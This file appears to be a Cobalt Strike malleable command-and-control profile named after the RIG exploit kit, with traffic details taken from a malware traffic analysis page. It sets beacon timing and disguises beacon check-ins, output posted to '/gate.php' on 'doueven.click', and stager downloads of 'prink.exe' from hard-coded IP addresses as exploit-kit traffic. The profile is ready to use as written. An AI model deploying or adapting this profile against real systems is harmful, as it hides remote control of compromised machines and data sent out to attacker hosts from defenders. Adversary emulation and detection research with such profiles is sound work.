#rigEK
#taken from --> http://www.malware-traffic-analysis.net/2018/01/30/index.html
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/";
    
    client {

	header "Accept" "text/html, */*";
	header "Accept-Language" "en-US";
	header "Host" "176.57.208.59";
	header "Connection" "Keep-Alive";
	
	
        
        metadata {
            netbios;
	    append "FeJzPWAlzAFfZGVub21pbmF0aW9ucwSTKqgxlbbnLbhBk";
	    parameter "Mzk2MTw";


        }

	parameter "GUaq" "OynNUEcKZTPj";

    }

    server {

        header "Server" "nginx/1.6.2";
	header "Content-Type" "text/html;charset=UTF-8";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "Content-Encoding" "gzip";
        

        output {
            netbios;

	    prepend "............[....0.<.Wx.a...=-...q..*.%(.. 	..~.TFW..U z....))%...of.|.....$.52.....w...~....o..._.....w8.........z......m.[..e....j.9<n.._+..5.uVi.-........qC...V.]n..._..'.w..e............y..o......j..-bdpejjbmbjlndoaaelihhjajeldfojpgnfeeiifgjfdngfhiaamjogcjfkiahfljijinfjbldnplecpebkgbgaijmpcjkpfnbfngbdnccpbnhlbiikgmhjmdakkbd..w.............fu...WY......o8.=..YG..%....:1..... :(.~.......u..n9m..m.......V:m...3......j2....vM....zVv.u.";

	    append "..EQk.....q.....1.t..pNjq...u...m.h..........z+....Z*X.r...
..*..N.z..8.1.m	.y.F.1....U.. .........
....Z'=..+..H...aI ..)..36J~..O.n.....J.....!=G...o._.....s!......-p.....+>........,.r......./......7|>.......2.5ad../.....-lj......N..T...x...9N..
.....N.a=..G..N...
.V.L.\"..U.d.Y.....s.....H.|.	.4e...(b.CLV....Z..x..^v...%bdpejjbmbjlndoaaelihhjajeldfojpgnfeeiifgjfdngfhiaamjogcjfkiahfljijinfjbldnplecpebkgbgaijmpcjkpfnbfngbdnccpbnhlbiikgmhjmdakkbd...K.).d.......j.~(.y.u+.._c*....S$p.R.).../.@.c......";

	    print;

	    
        }
    }
}

http-post {
    
    set uri "/gate.php";

    client {
       
	header "Host" "doueven.click";
	header "Connection" "close";
	header "Accept-Language" "en-US";
	header "Content-Type" "image/jpeg";
        
        output {
            netbios;
	    print;

        }
        
  	     
        id {
            netbios;
	    header "Cookie";

        }
    }

    server {

	header "Server" "Apache";
	header "Upgrade" "h2,h2c";
	header "Connection" "Upgrade, close";
	header "Content-Type" "application/octet-stream";
        

        output {
            netbios;
	    prepend "IX.";
	    prepend " ";
	    prepend " ";

            print;
        }
    }
}

http-stager {

	set uri_x86 "/prink.exe";
	set uri_x64 "/Prink.exe";

    client {
	header "Host" "31.31.203.14";
	header "Accept-Language" "en-us";
	header "Accept" "text/html, application/xml, image/png, image/jpeg, image/gif, image/x-xbitmap";
	header "Accept-Charset" "utf-8, utf-16, iso-8859-1";
	header "Pragma" "non-cache";
	header "Connection" "close";
    }

    server {
        header "Server" "nginx/1.10.2";
	header "Content-Type" "application/octet-stream";
	header "Keep-Alive" "timeout=2, max=100";
	header "Connection" "close";
	header "ETag" "be339-de000-563c784ba5900";
	header "Accept-Ranges" "bytes";
    
    }


}

stage {
	
	set compile_time "28 Jan 2018 08:12:18";
	set userwx "false";
	set image_size_x86 "428544";
	set image_size_x64 "428544";


}
